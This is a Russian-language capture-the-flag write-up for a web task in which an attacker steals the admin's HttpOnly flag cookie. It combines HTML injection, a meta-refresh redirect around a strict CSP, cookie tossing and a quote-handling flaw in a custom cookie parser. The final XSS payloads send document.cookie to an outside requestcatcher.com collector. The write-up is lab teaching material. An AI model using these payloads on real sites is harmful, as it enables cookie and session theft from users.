# Мультипаспорт

**Ссылка**: http://10.63.0.102:1337<br>
**Автор**: andreika47

## Описание

Для регистрации в системе, пожалуйста, предъявите ваш мультипаспорт

**Данные для участников:**
1. multipassport
2. http://10.63.0.102:1337

## Решение
Функционал приложения позволяет написать свой HTML код, который потом отрендерится на отдельной странице. Далее, этот код можно отправить на проверку администратору.
![Основной экран](https://gitlab.ctflab.local/andreika47/multipassport/-/raw/main/pic1.png)
![Возможна XSS](https://gitlab.ctflab.local/andreika47/multipassport/-/raw/main/pic2.png)
![Отправляем HTML на проверку](https://gitlab.ctflab.local/andreika47/multipassport/-/raw/main/pic3.png)
Изучив код задания можно выделить следующие интересные моменты:

1.  Администратор взаимодействует с приложением через браузер
2.  Флаг содержится в HttpOnly куке администратора
3.  Реализован кастомный парсинг заголовка с куками:
```
function parseCookies(cookieHeader)
```
4.  Пользователь и администратор используют разные эндпоинты для отображения HTML кода:  
```
ssessionRouter.get('/site/:id'  
adminRouter.get('/site/:id'  
```
Есть определенные намеки, что нужно эксплуатировать XSS и как-то украсть куку администратора.
Начнем с последнего шага: на пользовательском эндпоинте в коде явно задается CSP, позволяющая выполнять JavaScript код на странице.
```
CSP = '<meta http-equiv="Content-Security-Policy" content="default-src * \'unsafe-inline\'">';
```
На странице администратора CSP другая - она запрещает выполнение кода.
```
CSP = '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'">';
```
Значит нам нужно либо обойти эту политику, либо заставить администратора зайти на пользовательский эндпоинт без строгой CSP.
Редирект на пользовательский эндпоинт можно сделать, например, внедрив тег meta. Однако, теги meta должны быть внутри тега head, а наш код вставляется в тег body. Но так как наш HTML код никак не валидируется и не санитизируется:
```  
hosting_template = `<!DOCTYPE html>
	<html lang="ru">
		<head>
			<meta charset="UTF-8">
			<meta name="viewport" content="width=device-width, initial-scale=1.0">
			{{CSP}}
			<title>Мультипаспорт Федерации Планет</title>
			<link rel="stylesheet" href="/styles.css">
		</head>
		<body>
			{{site.html}}
			<div class="footer">
				<p>● НАРУШЕНИЕ МЕЖГАЛАКТИЧЕСКОГО АКТА 17-Ω КАРАЕТСЯ ИЗГНАНИЕМ В HYPERVISOR ●</p>
			</div>
			{{button}}
		</body>
	</html>`

…  
html = hosting_template
	.replaceAll("{{site.html}}", site.html || 'Мультипаспорт не найден')
	.replaceAll("{{site.id}}", site.id || 'ID не найден')
	.replaceAll("{{CSP}}", CSP)
	.replaceAll("{{button}}", button);

res.send(html);
```
То мы можем закрыть тег body, добавить свою секцию head и начать новую секцию body:
```
</body>
<head>
	<meta http-equiv="refresh" content="1; url=/public/site/{{site.id}}">
</head>
<body>
```
Далее, нужно обратить внимание, что при обращении к эндпоинту с нашим HTML кодом проверяется наличие сессии, соответствующей автору кода, или куки с флагом.
```
if ((!req.cookies["SESSION"] || req.cookies["SESSION"].toString() !== site.owner.toString()) && (!req.cookies["FLAG"] || req.cookies["FLAG"].toString() !== FLAG)) {
	return res.status(403).send('Это не ваш Мультипаспорт');
}
```
Администратор может ходить на наш сайт, так как у него есть кука с флагом. И теперь стоит разобраться с парсингом заголовка Cookie.
Самодельный парсер берет заголовок Cookie, где передаются все куки запроса и пытается разбить его на названия кук и значения. Необходимо заметить особенность обработки кук с двойными кавычками: парсер будет считать все, что окружено двойными кавычками значением куки. Тогда мы можем передать в запросе куку с открывающей двойной кавычкой, тогда все данные, указанные после нее будут распаршены как значение нашей куки:
```
Cookie: SomeCookie=12345; OUR_COOKIE=”1234; OtherAdminCookie=5678;
```
В таком случае парсер должен вернуть:
```
SomeCookie: 12345
OUR_COOKIE: ”1234; OtherAdminCookie=5678;
```
Важный нюанс: нужно не забыть закрыть кавычку, чтобы парсер отработал корректно. Тогда мы сможем добавить такие куки, чтобы кука с флагом была между открывающие и закрывающей кавычек и она будет записано как значение нашей куки без HttpOnly. Нам нужно получить примерно следующий заголовок Cookie:
```
Cookie: FLAF="1; FLAG=flag{REAL_FLAG}; FLAH=1”;
```
Если подкинуть куки, обрамляющие FLAG в кавычки, то эта кука "пропадет" у администратора и наш сайт перестанет быть ему доступен. Значит нам нужно подкинуть администратору куку с нашей сессией:
```
</body>
<head>
	<meta http-equiv="refresh" content="1; url=/public/site/{{site.id}}">
</head>
<body>
	<img src=x onerror='document.cookie="SESSION=e8a92517b30188823fae8f8ec690e9df; Path=/public; domain=localhost"'>
```
Для того, чтобы наша кука SESSION была более приоритетной, чем кука администратора, необходимо чтобы у наше куки был определен параметр Path. Подробнее про это можно почитать в статье про Cookie Tossing или в отчете нашего CTF SPACE-2.
Проверяем, что мы добились XSS:
```
</body>
<head>
	<meta http-equiv="refresh" content="1; url=/public/site/{{site.id}}">
</head>
<body>
	<img src=x onerror='document.cookie="SESSION=e8a92517b30188823fae8f8ec690e9df; Path=/public; domain=localhost"'>
	<img src="x" onerror='var xhr = new XMLHttpRequest();xhr.open("GET", "https://1234.requestcatcher.com/leak?token=" + encodeURIComponent(document.cookie), false);xhr.send();'>
```

Порядок кук с одинаковым Path не стандартизирован и зависит от реализации браузера. Поигравшись с порядком кук в Chromium получаем итоговый пэйлоад с подстановкой сессии и кук с двойными кавычками:
```
</body>
<head>
  <meta http-equiv="refresh" content="1; url=/public/site/{{site.id}}">
</head>
<body>
  <img src=x onerror='document.cookie="RESSION=1\"; Path=/public; domain=localhost"'>
  <img src=x onerror='document.cookie="SESSION=e8a92517b30188823fae8f8ec690e9df; Path=/public; domain=localhost"'>
  <img src=x onerror='document.cookie="FLAg=\"1; Path=/public; domain=localhost"'>
  <img src="x" onerror='var xhr = new XMLHttpRequest();xhr.open("GET", "https://1234.requestcatcher.com/leak?token=" + encodeURIComponent(document.cookie), false);xhr.send();'>
```
![Флаг получен](https://gitlab.ctflab.local/andreika47/multipassport/-/raw/main/pic6.png)